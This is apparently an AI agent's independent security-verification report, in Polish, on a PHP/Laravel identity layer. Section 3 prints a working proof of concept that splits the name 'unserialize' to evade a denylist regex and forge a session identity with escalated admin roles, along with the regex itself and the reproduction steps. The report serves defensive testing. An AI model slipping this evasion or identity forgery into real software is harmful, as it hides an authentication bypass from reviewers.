# RUNDA 12 — RAPORT NIEZALEŻNEGO WERYFIKATORA

**SHA mierzone:** `7a8c44d8dca055d9ad9af1efcd1e5eaed7140c51` (gałąź `faza-1-retencja`, „7a8c44d"; **jest czubkiem** repozytorium w chwili pomiaru).
**Zlecenie:** `docs/ZLECENIA/ZLECENIE-081.md` (runda 12).
**Data pomiaru:** 19.08.2026.
**Stawka:** F1 i F0 zamykają się WYŁĄCZNIE rundą z zerem znalezisk (D-2026-08-07-16).

## Werdykt jednym zdaniem

**Faza NIE zamyka się w tej rundzie. JEDNO znalezisko (WYSOKA).** Bramka na `7a8c44d`
jest zielona **22/22**, zgodna z deklaracją autora co do KAŻDEJ liczby (318 testów /
2251 asercji, podłogi RÓWNO 318/2251, perturbacje 61 kontroli / 44 scenariusze /
0 pominiętych); wszystkie zamknięcia §1, §2, §4, §5 zlecenia bronią się z kontrolą
pozytywną i negatywną; **żadnego z czterech twierdzeń autora nie udało się obalić.**
**Ale §3 (ściana typu — prywatny konstruktor „bez obejścia") ma obejście, którego
strażnik go nie łapie:**

- **R12-1 (WYSOKA)** — SIÓDME PIĘTRO. „Warunek utrzymujący R6A-3"
  (`WaskieGardloTozsamosciTest`) — ostatnia linia obrony ściany typu przed refleksją
  i deserializacją — jest **DENYLISTĄ** trzech literalnych pisowni
  (`unserialize(`, `newInstanceWithoutConstructor(`, `new ReflectionClass(`) i **da się
  ją ominąć**. Plik produkcyjny (na allowliście, czytający pole KONTRAKTOWE `code`)
  odtwarza `TozsamoscSesji` przez `$f = 'unse'.'rialize'; $f($ładunek)` — z pominięciem
  prywatnego konstruktora i ściany typu — i woła `SesjaKonta::zaktualizuj`, ustanawiając
  w sesji **dowolny `sub` i eskalację ról**. **CAŁA bramka zostaje zielona** (318 passed,
  Larastan „No errors", Pint 106 plików, sam `WaskieGardloTozsamosciTest` — 5 passed).
  Pisemna obietnica kontroli („pierwsza osoba, która je wprowadzi, dowie się od bramki")
  jest **nieprawdziwa**, a rundy 11 §6 („warunek utrzymujący broni się") — obalona
  pomiarem. To ta sama klasa, co R6A-4: **denylista przegrywa z wariantem spoza listy.**

**Zbieżność rund:** 29 → 9 → 2 → 5 → 1 → 3 → **1**.

---

## 0. Środowisko pomiaru — własne izolowane klony, NIE `gabinet-perturbacje`

Zgodnie ze zleceniem NIE użyłem stosu `gabinet-perturbacje` (montuje DRZEWO
dewelopera). Trzy efemeryczne klony przypięte do `7a8c44d`, refy potomne przycięte
PRZED skanem sekretów. Po pomiarach drzewa wracały KOPIĄ pliku, `git status --porcelain`
PUSTE; stosy do zgaszenia `down -v`.

| klon | katalog | projekt compose | porty HTTP/PG/Redis | rola |
|---|---|---|---|---|
| klon-a | `D:/tmp/gabinet-r12/klon-a` | `gabinet-r12a` | 8190 / 55540 / 56490 | bramka OD ZERA |
| klon-b | `D:/tmp/gabinet-r12/klon-b` | `gabinet-r12b` | 8191 / 55541 / 56491 | drugi przebieg (`--zostaw`) + żywy stos do sond zamknięć i mutacji R12-1 |
| klon-c | `D:/tmp/gabinet-r12/klon-c` | `gabinet-r12c` | 8192 / 55542 / 56492 | PEŁNE perturbacje |
| (subagent) | `D:/tmp/gabinet-r12/klon-b` | `gabinet-r12b` | 8191 / … | pomiar rozstrzygający R12-1 (świeży subagent bez mojego kontekstu) |

**Higiena klonu.** Po sklonowaniu: `git checkout 7a8c44d`, usunięcie `refs/remotes`,
`refs/tags`, gałęzi `faza-1-retencja`, `remote remove origin`, `reflog expire
--expire=now --all` + `gc --prune=now`. Po tym `git rev-list --all --count` = **155**,
historia kończy się na `7a8c44d`, krok [21] gitleaks ZIELONY (`no leaks found`,
155 commitów). Bez przycięcia [21] zapaliłby się na cytatach z commitów potomnych — to
znane (D-5), nie znalezisko. Refy potomnych i tak nie ma: `7a8c44d` **jest czubkiem**.

Stos dewelopera `gabinet` (8098/55442/56389) i `gabinet-perturbacje` (8097)
**NIETKNIĘTE**. Zakaz commitowania w repozytorium projektu utrzymany — jedyne zapisy to
ten raport i `ODPOWIEDZ-081.md`, oba niezacommitowane. W klonach efemerycznych nie
commitowałem (mutacje zakładane i cofane KOPIĄ pliku). Nic nie wypchnięto.

---

## 1. Pełna bramka — wynik LICZBOWY

Przebieg OD ZERA na czystym klonie `klon-a` przypiętym do `7a8c44d`
(`bash skrypty/bramka.sh --projekt gabinet-r12a`), **kod wyjścia odczytany WPROST z pliku,
nie z potoku** (`echo "KOD=$?" > plik`):

```
KOD_BRAMKI=0
BRAMKA OK — 22 kroków, 0 nieudanych
Tests: 2 skipped, 318 passed (2251 assertions)
WYKONANO 318 testów (podłoga: 318)               (RÓWNO — bez zapasu)
sprawdzono 2251 asercji (podłoga: 2251)          (RÓWNO — bez zapasu)
pominięte (nie liczą się do podłogi): 2          (oba: TwierdzeniaKomentarzyTest, dług D-3)
Pint:      PASS 106 files
Larastan (level max): [OK] No errors
gitleaks:  155 commits scanned, no leaks found
czas testów: 56 s
```

**Deklaracja autora (`ODPOWIEDZ-079` §1) POTWIERDZONA co do każdej liczby:**
22/22 · 318/2251 · podłogi RÓWNO 318/2251 · 2 pominięte. Podłogi to JEDNO źródło
`skrypty/podlogi.sh` (`MINIMUM_TESTOW=318`, `MINIMUM_ASERCJI=2251`) — **odczytane z pliku,
nie zacytowane**. Dwa pominięte to oba testy z `TwierdzeniaKomentarzyTest` (dług D-3).

**Drugi, niezależny przebieg** na klonie `klon-b` (projekt `gabinet-r12b`, inne porty,
`--zostaw`): `BRAMKA OK — 21 kroków, 0 nieudanych` (21, bo `--zostaw` pomija krok [22]),
`318 passed (2251)`, `155 commits, no leaks found` — te same liczby na innym klonie,
projekcie i portach.

**Perturbacje — PEŁNY zestaw, własny stos `gabinet-r12c`:**

```
KOD_PERTURBACJI=0
PERTURBACJE OK — 61 kontroli udowodniło, że umie zaświecić czerwono (pominięte: 0)
zmierzone niezależnie: 44 nagłówki „=== PERTURBACJA", 61 znaków ✓, 0 znaków ✗
```

**Zgodne z deklaracją autora (`ODPOWIEDZ-079`: 61 kontroli / 44 scenariusze /
0 pominiętych) co do każdej liczby.** Lista scenariuszy w `perturbacje.sh` (`WSZYSTKIE=`)
niesie **44** nazwy — policzone, nie zacytowane.

---

## 2. Weryfikacja zamknięć z `ODPOWIEDZ-079` — każde z kontrolą pozytywną I negatywną

Pomiary na żywym stosie `gabinet-r12b`, drzewo przywracane KOPIĄ pliku; po każdym
`git status --porcelain` PUSTE.

### §1 — podstawa zaufania z KONFIGURACJI: **BRONI SIĘ**

| kontrola | pomiar | wynik |
|---|---|---|
| NEGATYWNA (czysto) | `TypTozsamosciTest` | **13 passed** (całość) |
| POZYTYWNA (dowód skutku) | token o poprawnym kształcie (nasz wystawca, aud, świeże czasy, nasz `kid`) podpisany **CUDZYM** kluczem | `ok=false`, `roszczenia=null`, `kontrole['signature']='fail'` — odmowa z KONTROLI PODPISU |
| PRZYRZĄDU | token podpisany NASZYM kluczem | `ok=true` — podstawione IdP DAJE tożsamość (inaczej „nie da się zalogować" udawałoby bezpieczeństwo) |
| perturbacja `wymagania_wolajacego` | `zTokenu` znowu publiczne | **✓** czerwień z „PUBLICZNA METODA OBIEKTU ROSZCZEŃ" |

`zTokenu(string, array)` jest PRYWATNE; publiczne `zIdTokenu`/`zAccessTokenu` biorą
`KontaOidc` i składają `issuer/jwks/audience/typ/tolerancja` z konfiguracji. Kontroler
i `OdswiezanieSesji::przelicz` NIE pobierają JWKS. Zweryfikowane odczytem kodu.

### §2 — kontrola pyta o ISTOTĘ, nie nazwę: **BRONI SIĘ**

`TypTozsamosciTest` „obiekt roszczeń NIE PRZYJMUJE tablicy od wołającego" iteruje po
KAŻDEJ metodzie publicznej (nie tylko oddających obiekt) i zapala na dowolnej
przyjmującej `array`. Perturbacja `wymagania_wolajacego` (§1) to potwierdza.

### §3 — `final` zmierzone; **prywatny konstruktor MA OBEJŚCIE → R12-1**

| kontrola | pomiar | wynik |
|---|---|---|
| `final` (pozytywna) | `RoszczeniaZweryfikowane`, `TozsamoscSesji` → `isFinal()` | **true / true** |
| perturbacja `roszczenia_final` | zdjęcie `final` | **✓** czerwień „NIE jest `final`" |
| perturbacja `roszczenia_ctor` | konstruktor publiczny | **✓** czerwień „NIE jest prywatny" |
| **prywatny konstruktor „bez obejścia" (deserializacja)** | patrz **§3 RAPORTU (R12-1)** | **OBEJŚCIE ISTNIEJE, strażnik ślepy** |

`final` broni się. Publiczny konstruktor i przywrócenie `zPodmienionymi` — łapane.
**Ale zlecenie §3 kazało sprawdzić „czy prywatny konstruktor naprawdę nie ma obejścia
(fabryki, deserializacja, klonowanie)". Ma — deserializacją (i refleksją), a strażnik
tej drogi (`warunek utrzymujący R6A-3`) jest denylistą do ominięcia.** To jest R12-1.

### §4 — `nonce` / `kid` / cache JWKS: **BRONI SIĘ**

| wektor | kontrola | wynik |
|---|---|---|
| (a) `nonce` z żądania w callbacku | warstwa 3 `WaskieGardloZapisuTozsamosciTest` | odczyt pola spoza kontraktu (`code`,`state`) zapala |
| (b) `kid` z niezweryfikowanego nagłówka | zbiór kluczy JEST NASZ; obcy klucz → `signature=fail` (§1) | broni się |
| (c) zatruty cache JWKS | `WzmacniaczZadanTest` (perturbacje `nonce`, `wzmacniacz`) | ✓ w pełnym zestawie |

### §5 — `docs/DECYZJE.md`: **BRONI SIĘ**

Trzy wpisy obecne: `D-2026-08-19-01` (ściana typu), `D-2026-08-19-02` (podstawa zaufania),
`D-2026-08-12-04` (termin zwrotu, **autorstwa sesji SPEC-UMOWA**). D-12-04 przeniesiony
wiernie, w komunikacie oznaczony jako autorstwa innej sesji, z odnotowaniem procesowym
kolizji numeru. Zgodne z deklaracją.

### Warunek zamrożenia — **SPEŁNIONY**

```
git diff --stat 7a8c44d..HEAD -- . ':(exclude)docs/' ':(exclude)PLAN-FAZ.md'   →  PUSTO
git rev-parse HEAD                                                              →  7a8c44d…  (7a8c44d JEST czubkiem)
```

Ani jednej linii poza `docs/` ponad `7a8c44d`. `.gitleaks.toml` i `.gitignore` w zakresie
zamrożenia — bez zmian. **Nie znalezisko.**

### Podłogi RÓWNO, D-3/D-4/D-5 — **BRONIĄ SIĘ**

`podlogi.sh`: `318/2251` = bramka, RÓWNO. `TwierdzeniaKomentarzyTest` daje `2 skipped`
(D-3). `.gitleaks.toml` na `7a8c44d`: D-4 i D-5 OBA obecne (`grep -c` → po 1), żaden nie
usunięty pojedynczo.

---

## 3. ZNALEZISKO — R12-1 (WYSOKA)

### SIÓDME PIĘTRO: strażnik ściany typu jest DENYLISTĄ, którą da się ominąć — deserializacja/refleksja forguje tożsamość, a bramka milczy

**Co twierdzi autor (do zweryfikowania — `ZLECENIE-081` §3, kod).**
`TozsamoscSesji` i `RoszczeniaZweryfikowane` deklarują w komentarzach:

> „`Reflection::newInstanceWithoutConstructor()` oraz `unserialize()` omijają KAŻDY
>  konstruktor w PHP i tego nie da się zamknąć typem. WARUNEK UTRZYMUJĄCY: w kodzie
>  produkcyjnym nie ma ani `unserialize()`, ani wywołań `Reflection` — i to jest
>  **EGZEKWOWANE kontrolą, nie pamięcią**. Pierwsza osoba, która je wprowadzi, **dowie
>  się o tym od bramki**."

Runda 11 §6 odrzuciła ten wektor: „warunek utrzymujący broni się — na czystym drzewie
zbiór pusty".

**Dziura.** Kontrola (`WaskieGardloTozsamosciTest`, asercja „WARUNEK UTRZYMUJĄCY") skanuje
`Kod::katalogiWykonywalne()` (`app/`, `routes/`, `bootstrap/`, `config/`) wyrażeniem:

```
/\bunserialize\s*\(|\bnewInstanceWithoutConstructor\s*\(|new\s+ReflectionClass\s*\(/
```

nad wyjściem `Zrodlo::kod()` (komentarze usunięte, **literały napisowe zachowane**).
To jest **DENYLISTA trzech pisowni**. Zmierzone `preg_match` (w kontenerze):

| pisownia | match | uwaga |
|---|---|---|
| `new ReflectionClass(X)` | **1** | kanoniczna — łapana |
| `new \ReflectionClass(X)` | **0** | wiodący backslash — ślepa |
| `$m='newInstance'.'WithoutConstructor'; $r->$m()` | **0** | nazwa sklejana — ślepa |
| `$f='unse'.'rialize'; $f($p)` | **0** | nazwa funkcji sklejana — ślepa |
| `$r->newInstanceWithoutConstructor()` | **1** | wprost — łapana |

Na liście NIE MA też `ReflectionProperty`, `ReflectionObject` ani `new $zmienna`.

**Mechanizm eksploatujący (wstawiony do `powrot()` w `LogowanieController.php` — plik na
allowliście, trasa `/auth/callback`, czyta pole KONTRAKTOWE `code`, więc warstwa 3 milczy
SŁUSZNIE; zapis przez `zaktualizuj`, którego warstwy 2 i 4 nie skanują):**

```php
$wstrzyk = $request->query('code');                    // pole KONTRAKTOWE → warstwa 3 milczy
if (is_string($wstrzyk) && str_starts_with($wstrzyk, 'ATAK-')) {
    $dane = ['sub'=>$wstrzyk, 'sid'=>'sfx-atak', 'role'=>['koordynator','admin-fundacja'],
             'role_surowe'=>['koordynator'], 'markery'=>[], 'access_exp'=>time()+3600, /* … */];
    $nazwaKlasy = 'App\\Tozsamosc\\TozsamoscSesji';
    $plod = 'O:'.strlen($nazwaKlasy).':"'.$nazwaKlasy.'":1:{s:4:"dane";'.serialize($dane).'}';
    $odtworz = 'unse'.'rialize';                        // DENYLISTA ślepa na sklejenie
    $fake = $odtworz($plod);                            // TozsamoscSesji z pominięciem konstruktora
    if ($fake instanceof TozsamoscSesji) {
        SesjaKonta::zaktualizuj($request, $fake);       // zapis sforgowanej tożsamości
    }
    return redirect('/');
}
```

`serialize(` NIE jest na denyliście; `TozsamoscSesji` powstaje przez deserializer, nie
przez zakazany `new ReflectionClass`/`newInstanceWithoutConstructor`. `$fake` zawężone
`instanceof` (żeby przeszła statyka), więc `zaktualizuj(Request, TozsamoscSesji)` przyjmuje.

**Co zmierzone (stos `gabinet-r12b`, kontener `gabinet-r12b-app`, drzewo przywracane kopią):**

```
WaskieGardloTozsamosciTest + TypTozsamosciTest + WaskieGardloZapisuTozsamosciTest → 27 passed (109 asercji)
   w tym „WARUNEK UTRZYMUJĄCY: kod produkcyjny nie używa Reflection ani unserialize" → ZIELONE
PEŁNA SUITA                                → 2 skipped, 318 passed (2251)  ← identycznie jak bazowo
Larastan (level max)                       → [OK] No errors
Pint (cały plik / 106 plików)              → PASS
```

**DOWÓD RUNTIME forgingu tożsamości** (jądro aplikacji w kontenerze, `powrot()` z
`?code=ATAK-KOORDYNATOR-999`):

```
status powrot: 302
SFORGOWANA TOZSAMOSC W SESJI:
  sub  = ATAK-KOORDYNATOR-999            ← wartość podana przez żądającego
  role = ["koordynator","admin-fundacja"]  ← eskalacja pionowa
  access_exp w przyszłości: TAK          ← przeżywa `wymagaOdswiezenia`, `stanKonta` ją odda
```

Bez callbacku OIDC, bez wymiany kodu, bez weryfikacji podpisu — dokładnie to, czego §2
CLAUDE.md zabrania, a co ściana typu miała uczynić „niewyrażalnym".

**Kontrola przyrządu (POZYTYWNA — skaner UMIE zapalić, tylko nie na tej pisowni).**
Literał `unserialize('a:0:{}')` wstawiony do `OdswiezanieSesji.php`:

```
WaskieGardloTozsamosciTest → 1 failed, 4 passed
   „W kodzie produkcyjnym pojawiło się narzędzie omijające konstruktory
    (app/Tozsamosc/OdswiezanieSesji.php)."
```

Skaner NIE jest zepsuty ogólnie — jest **denylistą z dziurą**: literał zapala, sklejenie
nie. To para pozytywna/negatywna, która przypisuje czerwień/zieleń DOKŁADNIE tej różnicy.

**Pomiar rozstrzygający — świeży subagent bez mojego kontekstu.** Odtworzył wariant
`unserialize` od zera na tym samym stosie. Wynik IDENTYCZNY: `WaskieGardloTozsamosciTest`
5 passed (warunek utrzymujący ZIELONY), Larastan „No errors", Pint PASS, runtime
`sub=ATAK-KOORDYNATOR-777 role=["koordynator","admin-fundacja"]`, drzewo po przywróceniu
PUSTE. **Rozbieżność ze mną: ŻADNA.**

**Dlaczego znalezisko, a nie znana granica.**
1. **R6A-3 (Reflection/unserialize) NIE jest na liście znanych długów** zlecenia (D-3, D-4,
   D-5, O-6c, `.zakres-sesji`). Autor uczynił z niego „warunek utrzymujący EGZEKWOWANY
   kontrolą" — a kontrola nie egzekwuje tego, co deklaruje.
2. **Rozjazd opisu ze stanem.** Komentarz kodu obiecuje „dowie się od bramki"; bramka
   milczy dla całej klasy pisowni. To dokumentacja kłamiąca o kodzie (WYTYCZNE:
   „dokumentacja o kodzie też jest przyrządem — i też kłamie").
3. **Precedens ekosystemowy R6A-4 i rdzeń „allowlisty, nie denylisty".** Ta sama klasa:
   `PRYMITYWY_POSWIADCZEN` przegrało z `hash('sha256')`; tu denylista trzech pisowni
   przegrywa ze sklejeniem `'unse'.'rialize'`. WYTYCZNE wymagają allowlisty tam, gdzie
   fałszywe zielone kosztuje dostęp do kartotek — a to jest kontrola tożsamości.
4. **Obala rundę 11 §6** („warunek utrzymujący broni się") oraz zdanie z `ZLECENIE-081`
   §3 („sprawdź też, czy prywatny konstruktor naprawdę nie ma obejścia") — ma.

**Waga: WYSOKA.** Jak R11-1/R11-2 (też WYSOKA): NIE eksploatowalne na czystym `7a8c44d`
z zewnątrz — na czystym drzewie mechanizmu NIE MA. Groźny jest **fałszywy spokój**:
kontrola reklamuje niezmiennik „tożsamości nie da się ustanowić bez weryfikacji podpisu"
i nosi **pisemne zapewnienie, że dziury nie ma**, a pomiar to zapewnienie obala. Następny
autor (albo ktoś z dostępem do commita) wprowadza forgery **niewidzialnie dla bramki**,
w obszarze, który przez sześć rund był rdzeniem polowania.

**Kierunek naprawy (wektor z pomiaru).** Zamienić denylistę na **allowlistę**: zamiast
„nie ma tych trzech pisowni" — „każde wywołanie `unserialize`/`Reflection*` w kodzie
produkcyjnym jest DOPUSZCZONE jawnie" (skan przez lekser `token_get_all`, nie regex nad
tekstem — dokładnie tak, jak `Kod`/`Zrodlo` już robią dla zapisu tożsamości: `T_STRING`
o nazwie z rodziny `unserialize`/`Reflection*` i wywołania dynamiczne `$zmienna(`/
`->$zmienna(`, niezależnie od backslasha i sklejeń). Sam skan literalny nad tekstem jest
tą samą klasą, którą `Zrodlo` powstało naprawić.

**Odtworzenie (dokładne polecenia).**
```
# 1. klon + stos
mkdir -p /d/tmp/gabinet-r12 && cd /d/tmp/gabinet-r12
git clone --no-hardlinks /d/KOD/Niepodzielni/gabinet klon-b && cd klon-b && git checkout 7a8c44d
# przytnij refy potomne (jak w §0)
GABINET_BRAMKA_PORT_HTTP=8191 GABINET_BRAMKA_PORT_POSTGRES=55541 GABINET_BRAMKA_PORT_REDIS=56491 \
  bash skrypty/bramka.sh --projekt gabinet-r12b --zostaw          # stos gabinet-r12b-app

# 2. wstrzyk do backend/app/Http/Controllers/LogowanieController.php:
#    - dodać `use App\Tozsamosc\TozsamoscSesji;`
#    - po bloku `if (! $request->filled('code')) { return redirect('/'); }` wstawić blok z §3 (LF)

# 3. pomiar (kontener):
docker exec gabinet-r12b-app sh -c 'cd /srv/gabinet/backend && ./vendor/bin/pest tests/Feature/WaskieGardloTozsamosciTest.php'   # 5 passed
docker exec gabinet-r12b-app sh -c 'cd /srv/gabinet/backend && ./vendor/bin/phpstan analyse --no-progress'                        # No errors
docker exec gabinet-r12b-app sh -c 'cd /srv/gabinet/backend && ./vendor/bin/pint --test app/Http/Controllers/LogowanieController.php'  # PASS
docker exec gabinet-r12b-app sh -c 'cd /srv/gabinet/backend && ./vendor/bin/pest'                                                  # 318 passed
# runtime: Request::create('/auth/callback','GET',['code'=>'ATAK-…','state'=>'x']) → powrot() → SesjaKonta::odczytaj → sub/role

# 4. przywrócić plik KOPIĄ, git status --porcelain → PUSTE. NIE commitować.
```

---

## 4. Próba obalenia CZTERECH twierdzeń autora — WSZYSTKIE OBRONIŁY SIĘ

| twierdzenie | próba | wynik |
|---|---|---|
| **`?string $refreshToken` „nie rozstrzyga o tożsamości"** | próba uzyskania nim sesji INNEGO podmiotu | **NIE OBALONE.** Refresh token czytany WYŁĄCZNIE z własnej sesji (`$tozsamosc->refreshToken()`) albo z ciała odpowiedzi IdP — nigdy z żądania. `sub` zawsze ze ZWERYFIKOWANEGO access tokenu; `przelicz` KOŃCZY sesję przy `sub` rozjeżdżającym się (`$roszczenia->napis('sub') !== $obecna->sub()`). Refresh tokenem nie da się ustanowić ani podmienić tożsamości. |
| **`wszystkie()` „wynik weryfikacji, nie droga ominięcia"** | forging roszczeń i podanie tablicy | **NIE OBALONE zwykłym kodem.** `wszystkie()` oddaje roszczenia obiektu, którego w zwykłym kodzie nie da się wytworzyć (konstruktor prywatny, brak fabryki z tablicy, `final`). *Uwaga:* deserializacją forguje się i ten obiekt — ale to jest R12-1 (dziura strażnika), a nie słabość `wszystkie()`. |
| **`KontaOidc` jako parametr fabryk → wektor przez konfigurację, nie kod** | podstawienie inaczej skonfigurowanej instancji z żądania | **NIE OBALONE.** `KontaOidc` jest `final`, bez konstruktora, czyta `config('konta.*')` globalnie. W kodzie produkcyjnym NIE MA ścieżki żądanie→config dla `konta.*` (jedyny `config([…])` to `mail.default` w `AppServiceProvider`, niezależny od żądania). Wektor prowadzi przez `.env`/kontener, jak autor deklaruje. |
| **Zegar — POZA zakresem F1** | przesunięcie ważności tokenu BEZ ruszania zegara hosta | **NIE ZNALEZIONE.** `exp`/`iat` porównywane z `time()`/`CarbonImmutable::now()`; `tolerancja_zegara` z `.env` (kontrakt ≤30 s), nie z żądania. Brak drogi przesunięcia ważności bez zegara hosta. Zgodnie z §twierdzenia — nie znalezisko. |

**Żadnego z czterech nie obaliłem.** R12-1 jest ORTOGONALNE — nie korzysta z żadnego
z tych czterech wektorów; omija samą ścianę typu przez dziurę jej strażnika.

---

## 5. Odrzucone po pomiarze — NIE są znaleziskami

- **Ściana typu przez FABRYKĘ** — `TypTozsamosciTest` i `WaskieGardloTozsamosciTest`
  zabraniają publicznej metody oddającej `self` i przyjmującej `array`; jedyna publiczna
  fabryka `TozsamoscSesji` bierze `Request`. Broni się (pozytywna + negatywna).
- **Ściana typu przez KLONOWANIE** — obie klasy `final readonly`, bez `__clone`; klon daje
  IDENTYCZNĄ kopię (te same roszczenia), bezużyteczną dla napastnika.
- **Ściana typu przez KLASĘ POTOMNĄ** — obie `final` (perturbacja `roszczenia_final` +
  test na `TozsamoscSesji`). Broni się.
- **Ściana typu przez KONTENER ZALEŻNOŚCI** — `KontaOidc` klasa konkretna `final`, bez
  wiązania interfejsu; brak podmiany wpływanej żądaniem. Broni się.
- **Ściana typu przez PODMIENIONĄ KONFIGURACJĘ** — brak ścieżki żądanie→`config('konta.*')`
  w kodzie produkcyjnym. Broni się.
- **Cztery twierdzenia autora** (§4) — nie obaliłem żadnego.
- **`Bramki` / eskalacja ról bez forgingu** — role liczone z białej listy `config` na
  ZWERYFIKOWANYM access tokenie, w `zaloz` i `zOdswiezonymi`; brak drogi wstrzyknięcia
  bez R12-1.
- **`SprawdzUniewaznienie` / `RejestrSesji` / back-channel logout** — czytałem strukturę
  przy R12-1; unieważnienie po `sid` (obecność wiersza, nie wiek), magazyn w bazie,
  próg z SSO Session Max. Mutacjami osobno nie sondowałem (patrz §7).
- **Warunek zamrożenia, D-3/D-4/D-5, podłogi RÓWNO, DECYZJE.md** — §2 raportu. Nie znaleziska.

---

## 6. Sprzeczne polecenia i koszt cofnięcia (pozycja stała WYTYCZNE)

**Brak.** Zlecenie `ZLECENIE-081` nie koliduje z wcześniejszym poleceniem, z `CLAUDE.md`
ani z `docs/DECYZJE.md`. Warunek zamrożenia miał w rundzie 11 dwie formy (body vs
uzupełnienie) przez commit D-5 ponad SHA — w rundzie 12 `7a8c44d` JEST czubkiem, więc
problem nie występuje: `git diff` poza `docs/` jest PUSTY w każdej formie. Koszt cofnięcia
znaleziska: zero po mojej stronie (mutacje w klonach cofnięte kopią, `git status` PUSTE).

---

## 7. CZEGO NIE SPRAWDZIŁEM (sekcja OBOWIĄZKOWA)

1. **R12-1 przez pełne jądro HTTP z prawdziwym ciasteczkiem sesji** — dowód runtime
   zrobiłem wywołując `powrot()` bezpośrednio z żądaniem pod ręką (`setLaravelSession`);
   pełnej ścieżki `/auth/callback` przez nginx+php-fpm z roundtripem ciasteczka NIE
   odtwarzałem.
2. **Warianty R12-1 poza `unserialize`** — zmierzyłem `preg_match` dla `new \ReflectionClass`,
   dynamicznej nazwy metody i dynamicznego `unserialize`; **runtime forging** odtworzyłem
   TYLKO wariantem `unserialize`. Wariant `new \ReflectionClass`+`ReflectionProperty`
   przechodzi statykę i test, ale Pint żąda importu `\ReflectionClass` (który wtedy trafia
   w denylistę) — pełnej ścieżki „refleksja + zielony Pint" nie domknąłem (nie było
   potrzeby: `unserialize` domyka całą bramkę).
3. **Czy R12-1 forguje też `RoszczeniaZweryfikowane`** (i przez `zaloz`, nie `zaktualizuj`)
   — logicznie ta sama droga (deserializacja), ale osobno NIE mierzyłem; mierzyłem
   `TozsamoscSesji` + `zaktualizuj`.
4. **`SprawdzUniewaznienie`, `RejestrSesji`, back-channel logout, `SladWylogowania`** —
   nie sondowałem mutacjami; perturbacje `logout_failsafe`, `wymuszone_wylogowanie`,
   `uniewaznienie_sid` zapaliły w pełnym zestawie, poza tym bez osobnych prób.
5. **`WalidatorTokenu` — merytoryka podpisu/DER/`aud`/`iss`/`exp`/`typ`** — czytałem kod,
   dowód skutku (obcy klucz) mierzyłem, ale samej matematyki DER i wariantów `aud`
   (string vs tablica) mutacjami nie łamałem.
6. **Fuzzing parsera `Kod::funkcje()` / `polaZadaniaCzytaneW`** — atrybucję sprawdziłem
   tylko na mechanizmie R12-1 i istniejących testach `atrybucja do FUNKCJI`; parsera
   osobno nie łamałem (zagnieżdżone domknięcia, `match`, heredoc z klamrami).
7. **`TwierdzeniaKomentarzyTest`** (D-3) — poza bramką; potwierdziłem tylko, że to on daje
   `2 skipped`.
8. **`odczyt-przyczyn.py` / tryb DYNAMICZNY allowlist** — nie odtwarzałem.
9. **Merytoryka retencji F1** — perturbacje `retencja`, `retencja_wykonanie` zapalają
   w pełnym zestawie; poza tym mutacjami nie sondowałem.
10. **Współbieżność** (`CLAUDE.md` §6, 100 równoczesnych żądań) — poza suitą, zakres F3.
11. **CI (GitHub Actions)** — nie uruchamiałem; bramka mierzona wyłącznie lokalnie.
12. **Kontrakty wobec `konta/`, `hub/`, `helpdesk/`** — poza zasięgiem rundy.

---

## 8. Zakres pokryty — dla jawności (żeby dało się go zakwestionować)

Zmierzone: pełna bramka OD ZERA (22 kroki, 318/2251 RÓWNO z podłogami, kod 0 odczytany
WPROST, `no leaks found`, 155 commitów po przycięciu) na czystym klonie `7a8c44d`; drugi
niezależny przebieg na drugim klonie/projekcie/portach; PEŁNY zestaw perturbacji
(61 kontroli / 44 scenariusze / 0 pominiętych, kod 0), policzony niezależnie (44 nagłówki,
61 ✓, 0 ✗); zamknięcia §1 (dowód skutku obcym kluczem, pozytywna + przyrządu + perturbacja),
§2, §3 (`final` + prywatny konstruktor — i OBEJŚCIE R12-1), §4 (a/b/c), §5 (trzy wpisy
DECYZJE, atrybucja D-12-04); warunek zamrożenia; **ściana typu przeciw SZEŚCIU drogom
obejścia z §Główne zadanie zlecenia** (fabryki, deserializacja — ZŁAMANA, klonowanie,
klasa potomna, kontener zależności, podmieniona konfiguracja); **cztery twierdzenia autora
— próba obalenia, żadne nie obalone**; JEDNO znalezisko (R12-1) z żywym mechanizmem,
dowodem skutku przez jądro aplikacji, kontrolą przyrządu pozytywną (literał zapala) /
negatywną (sklejenie milczy) oraz pomiarem rozstrzygającym świeżego subagenta bez
rozbieżności.

**Czego zakres NIE obejmuje** — sekcja §7 (12 pozycji). W szczególności: pełnej ścieżki
HTTP dla R12-1, wariantu refleksyjnego z zielonym Pintem, forgingu `RoszczeniaZweryfikowane`,
merytoryki walidatora tokenu, fuzzingu parsera, sond mutacyjnych rejestru sesji/wylogowania,
współbieżności F3 i CI.

**Zbieżność rund:** 29 → 9 → 2 → 5 → 1 → 3 → **1**.

**Faza F1/F0 pozostaje OTWARTA — jedno znalezisko. Runda nie kończy się zerem.**
Fazę zamyka wyłącznie runda z zerem znalezisk (D-2026-08-07-16) — kryterium nie łagodzę.
R12-1 leży w tym samym wąskim gardle tożsamości co rundy 6–11, o piętro wyżej: ściana typu
zamknęła szóste piętro, a jej STRAŻNIK (denylista Reflection/unserialize) jest siódmym
piętrem tej samej klasy — kontrola oparta na rozpoznaniu KSZTAŁTU kodu, która ma brzeg,
i brzeg da się przekroczyć.
